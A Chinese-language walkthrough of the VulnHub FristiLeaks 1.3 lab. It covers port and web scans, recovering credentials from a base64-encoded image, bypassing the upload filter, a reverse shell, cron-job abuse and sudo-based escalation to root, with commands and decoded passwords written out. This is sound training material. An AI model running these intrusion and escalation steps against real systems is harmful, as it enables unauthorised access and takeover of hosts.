# FristiLeaks：1.3

下载地址：

```
https://download.vulnhub.com/fristileaks/FristiLeaks_1.3.ova
```

## 实战操作

需要修改MAC地址为：`08:00:27:A5:A6:76`。

![](<../../.gitbook/assets/image (13) (1) (1) (1) (1) (1).png>)

靶机IP地址：`192.168.0.13`。

扫描IP地址

```
┌──(root💀kali)-[~/Desktop]
└─# nmap -p1-65535 192.168.0.13                                                                                                                                                                               
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-21 04:43 EST
Nmap scan report for 192.168.0.13
Host is up (0.00038s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 08:00:27:A5:A6:76 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 150.67 seconds
```

```
┌──(root💀kali)-[~/Desktop]
└─# nikto -h http://192.168.0.13/
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.0.13
+ Target Hostname:    192.168.0.13
+ Target Port:        80
+ Start Time:         2021-12-21 04:48:02 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3
+ Server may leak inodes via ETags, header found with file /, inode: 12722, size: 703, mtime: Tue Nov 17 13:45:47 2015
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Entry '/cola/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/sisi/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/beer/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ "robots.txt" contains 3 entries which should be manually viewed.
+ PHP/5.3.3 appears to be outdated (current is at least 7.2.12). PHP 5.6.33, 7.0.27, 7.1.13, 7.2.1 may also current release for each branch.
+ Apache/2.2.15 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE 
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3268: /images/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 8727 requests: 0 error(s) and 15 item(s) reported on remote host
+ End Time:           2021-12-21 04:48:24 (GMT-5) (22 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

浏览器打开80端口，首页是一个图片。

![](<../../.gitbook/assets/image (16) (1) (1) (1) (1).png>)

按照nikito扫描到内容，存在robots.txt。但是遗憾的是，这三个目录都是没有价值的。

![](<../../.gitbook/assets/image (15) (1) (1) (1) (1) (1) (1) (1).png>)

我尝试把首页各个词汇做成目录爆破字典，但是也不存在。

```
┌──(root💀kali)-[/tmp]
└─# cat /tmp/1.txt         
meneer
barrebas
rikvduijn
wez3forsec
PyroBatNL
0xDUDE
annejanbrouwer
Sander2121
Reinierk
DearCharles
miamat
MisterXE
BasB
Dwight
Egeltje
pdersjant
tcp130x10
spierenburg
ielmatani
renepieters
Mystery guest
EQ_uinix
WhatSecurity
mramsmeets
Ar0xA
@meneer
@barrebas
@rikvduijn
@wez3forsec
@PyroBatNL
@0xDUDE
@annejanbrouwer
@Sander2121
Reinierk
@DearCharles
@miamat
MisterXE
BasB
Dwight
Egeltje
@pdersjant
@tcp130x10
@spierenburg
@ielmatani
@renepieters
Mystery guest
@EQ_uinix
@WhatSecurity
@mramsmeets
@Ar0xA
                                                                                                                                                                                                                                             
┌──(root💀kali)-[/tmp]
└─# dirb http://192.168.0.13/ /tmp/1.txt

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue Dec 21 05:04:35 2021
URL_BASE: http://192.168.0.13/
WORDLIST_FILES: /tmp/1.txt

-----------------

GENERATED WORDS: 44                                                            

---- Scanning URL: http://192.168.0.13/ ----
                                                                                                                                                                                                                                            
-----------------
END_TIME: Tue Dec 21 05:04:35 2021
DOWNLOADED: 44 - FOUND: 0
                           
```

回归到首页，我发现图片的first多了一个I，于是成功发现它的目录。

![](<../../.gitbook/assets/image (7) (1).png>)

输入一些注入语句发现不生效，右键查看页面源代码，找到作者的注释。

![](<../../.gitbook/assets/image (13) (1) (1) (1) (1).png>)

继续往下翻，找到一串base64加密字符串，最后解密是一张图片

![](<../../.gitbook/assets/image (15) (1) (1) (1) (1) (1) (1) (2).png>)

或者这样解密

```
cat enc | base64 --decode > dec.png
```

根据这两张图片分析找到账号和密码：`eezeepz/keKkeKKeKKeKkEkkEk`。并用其进行登录

![](<../../.gitbook/assets/image (17) (1) (1) (1) (1) (1) (1).png>)

上传功能只允许jpg、png、gif图片格式上传，修改一下后缀，绕过上传。

![](<../../.gitbook/assets/image (21) (1) (1) (1) (1).png>)

NC进行反弹shell。

![](<../../.gitbook/assets/image (14) (1) (1) (1) (1) (1) (1).png>)

使用python使终端shell稳定。

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

来到`/home/eezeepz`目录下面，查看笔记内容，笔记大概说可执行命令在/home/admin里面，然后你需要在/tmp/runthis生成命令行才可以执行（定时计划）。

```
cat notes.txt
Yo EZ,

I made it possible for you to do some automated checks, 
but I did only allow you access to /usr/bin/* system binaries. I did
however copy a few extra often needed commands to my 
homedir: chmod, df, cat, echo, ps, grep, egrep so you can use those
from /home/admin/

Don't forget to specify the full path for each binary!

Just put a file called "runthis" in /tmp/, each line one command. The 
output goes to the file "cronresult" in /tmp/. It should 
run every minute with my account privileges.

- Jerry
```

等大概一分钟就可以授权完毕。

```
bash-4.1$ echo "/home/admin/chmod 777 /home/admin" > /tmp/runthis
echo "/home/admin/chmod 777 /home/admin" > /tmp/runthis
bash-4.1$ ls /home/admin
ls /home/admin
cat    cronjob.py       cryptpass.py  echo   grep  whoisyourgodnow.txt
chmod  cryptedpass.txt  df            egrep  ps
```

其中在`/home/admin`目录发现一些加密文件和加密脚本。

```
bash-4.1$ ls
ls
cat    cronjob.py       cryptpass.py  echo   grep  whoisyourgodnow.txt
chmod  cryptedpass.txt  df            egrep  ps

bash-4.1$ cat cryptedpass.txt
cat cryptedpass.txt
mVGZ3O3omkJLmy2pcuTq

bash-4.1$ cat whoisyourgodnow.txt
cat whoisyourgodnow.txt
=RFn0AKnlMHMPIzpyuTI0ITG

bash-4.1$ cat cryptpass.py 
cat cryptpass.py 
#Enhanced with thanks to Dinesh Singh Sikawar @LinkedIn
import base64,codecs,sys

def encodeString(str):
    base64string= base64.b64encode(str)
    return codecs.encode(base64string[::-1], 'rot13')

cryptoResult=encodeString(sys.argv[1])
print cryptoResult
bash-4.1$ 
```

根据上面加密脚本反推解密脚本，加密过程：字符串base64加密，然后字符串顺序倒转，最后每个字符移动13位；解密过程：同样移动13位，这样原来字母位置没有变化，再把字符串顺序倒转，再进行base64解码。

![](<../../.gitbook/assets/image (27) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

```
import base64,codecs
def decodeString(enstr):
    a = codecs.encode(enstr, 'rot13')
    b = a[::-1]
    c = base64.b64decode(b)
    return c

d = decodeString('mVGZ3O3omkJLmy2pcuTq')
e = decodeString('=RFn0AKnlMHMPIzpyuTI0ITG')
print d
print e


thisisalsopw123
LetThereBeFristi!
```

我们已经找到两个密码，这时候查看/etc/passwd文件找用户去登录。

```
sh-4.1$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
gopher:x:13:30:gopher:/var/gopher:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin
saslauth:x:499:76:Saslauthd user:/var/empty/saslauth:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
apache:x:48:48:Apache:/var/www:/sbin/nologin
mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash
vboxadd:x:498:1::/var/run/vboxadd:/bin/false
eezeepz:x:500:500::/home/eezeepz:/bin/bash
admin:x:501:501::/home/admin:/bin/bash
fristigod:x:502:502::/var/fristigod:/bin/bash
fristi:x:503:100::/var/www:/sbin/nologin
```

测试`fristigod/LetThereBeFristi!`登录成功

```
bash-4.1$ su fristigod
su fristigod
Password: LetThereBeFristi!

bash-4.1$ whoami
whoami
fristigod
bash-4.1$ 
```

查看sudo支持命令

```
sudo -l
[sudo] password for fristigod: LetThereBeFristi!

Matching Defaults entries for fristigod on this host:
    requiretty, !visiblepw, always_set_home, env_reset, env_keep="COLORS
    DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS", env_keep+="MAIL PS1
    PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY
    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL
    LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User fristigod may run the following commands on this host:
    (fristi : ALL) /var/fristigod/.secret_admin_stuff/doCom
```

按照提示需要调用`fristi`用户`doCom`命令才可以提权。

```
bash-4.1$ sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom /bin/bash
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom /bin/bash
bash-4.1# whoami
whoami
root
bash-4.1# ls /root
ls /root
fristileaks_secrets.txt
bash-4.1# cat /root/LC_IDENTIFICATION
cat /root/LC_IDENTIFICATION
cat: /root/LC_IDENTIFICATION: No such file or directory
bash-4.1# cat /root/fristileaks_secrets.txt
cat /root/fristileaks_secrets.txt
Congratulations on beating FristiLeaks 1.0 by Ar0xA [https://tldr.nu]

I wonder if you beat it in the maximum 4 hours it's supposed to take!

Shoutout to people of #fristileaks (twitter) and #vulnhub (FreeNode)


Flag: Y0u_kn0w_y0u_l0ve_fr1st1
```
